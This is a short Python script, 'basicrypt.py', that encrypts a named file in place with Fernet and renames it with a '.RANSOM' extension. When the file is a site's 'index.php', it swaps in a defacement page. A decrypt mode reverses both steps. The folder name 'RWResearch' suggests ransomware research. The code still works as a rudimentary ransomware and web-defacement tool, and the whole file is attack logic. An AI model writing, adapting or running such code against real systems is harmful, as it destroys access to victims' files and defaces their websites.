from cryptography.fernet import Fernet
import os
import sys

if sys.argv[1] == "--h":
    print('''
    
------------------------------------------------    
------------------------------------------------

▄▄▄▄·  ▄▄▄· .▄▄ · ▪   ▄▄· ▄▄▄   ▄▄▄· ▄· ▄▌▄▄▄▄▄
▐█ ▀█▪▐█ ▀█ ▐█ ▀. ██ ▐█ ▌▪▀▄ █·▐█ ▄█▐█▪██▌•██  
▐█▀▀█▄▄█▀▀█ ▄▀▀▀█▄▐█·██ ▄▄▐▀▀▄  ██▀·▐█▌▐█▪ ▐█.▪
██▄▪▐█▐█ ▪▐▌▐█▄▪▐█▐█▌▐███▌▐█•█▌▐█▪·• ▐█▀·. ▐█▌·
·▀▀▀▀  ▀  ▀  ▀▀▀▀ ▀▀▀·▀▀▀ .▀  ▀.▀     ▀ •  ▀▀▀ 

Basic encryption using:
* AES in CBC mode with a 128-bit key for encryption
* PKCS7 padding
* HMAC using SHA256 for authentication
* Initialization vectors are generated using os.urandom()

Refer to https://cryptography.io/en/latest/fernet/

------------------------------------------------    
            ***   INSTRUCTIONS  ***
------------------------------------------------    
(1) Generate key by executing 'key_generator.py'

For encryption:
(2) Use the key generated in (1) as follows:
        
    $ python3 basicrypt.py -e RANSOM.key file.txt
    
For decryption:
(3) Remember the file type would have changed:

    $ python3 basicrypt.py -d RANSOM.key file.RANSOM
    
Note: if 'index.php' is being encrypted, a deface 
page will be generated automatically.

''')

else:    
    with open(sys.argv[2], 'rb') as filekey:
        key = filekey.read()

    fernet = Fernet(key)

    if sys.argv[1] == "-e":

        current_file = sys.argv[3]
        with open(current_file, 'rb') as file:
            original = file.read()

        encrypted = fernet.encrypt(original)

        with open(current_file, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)

        base = os.path.splitext(current_file)[0]
        os.rename(current_file, base + '.RANSOM')

        # Need a way to change this back
        if base == "index":
            os.rename('RWResearch/deface.php', 'index.php')

    elif sys.argv[1] == "-d":

        current_file = sys.argv[3]
        with open(current_file, 'rb') as enc_file:
            encrypted = enc_file.read()

        decrypted = fernet.decrypt(encrypted)

        with open(current_file, 'wb') as dec_file:
            dec_file.write(decrypted)

        base = os.path.splitext(current_file)[0]
        if base != "index":
            os.rename(current_file, base + '.txt')
        else : 
            # rename the defaced index page back to 'deface.php'
            os.rename('index.php', 'RWResearch/deface.php')
            os.rename(current_file, base + '.php')
